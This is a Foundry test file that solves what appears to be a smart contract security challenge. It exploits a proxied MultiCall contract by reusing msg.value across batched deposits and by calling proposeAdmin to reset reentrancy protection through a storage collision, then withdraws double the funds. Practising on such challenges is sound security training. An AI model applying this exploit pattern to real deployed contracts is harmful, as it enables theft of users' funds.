// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {MultiCall, MultiCallProxy} from "challenges/3-MultiCall.sol";

contract MultiCallTest is Test {
    MultiCall public multiCall;

    function setUp() public {
        address multiCallImpl = address(new MultiCall());
        multiCall = MultiCall(address(new MultiCallProxy(multiCallImpl)));
        multiCall.deposit{value: 1 ether}();
    }

    function test_solve() public {
        address attacker = makeAddr("Attacker");
        vm.deal(attacker, 1 ether);

        // To check sotrage layouts in foundry:
        // forge  inspect --pretty MultiCall  storageLayout
        // forge  inspect --pretty MultiCallProxy  storageLayout

        bytes[] memory payload = new bytes[](3);
        payload[0] = abi.encodeCall(MultiCall.deposit, ()); // deposit
        payload[1] = abi.encodeCall(MultiCallProxy.proposeAdmin, (address(0))); // Reset reentrancy proteciton
        payload[2] = abi.encodeCall(MultiCall.deposit, ()); // deposit reusing msg.value
        
        vm.startPrank(attacker);
        multiCall.multicall{value: 1 ether}(payload);
        multiCall.execute(attacker, 2 ether);

        assertTrue(MultiCallProxy(payable(address(multiCall))).isSolved());
    }
}


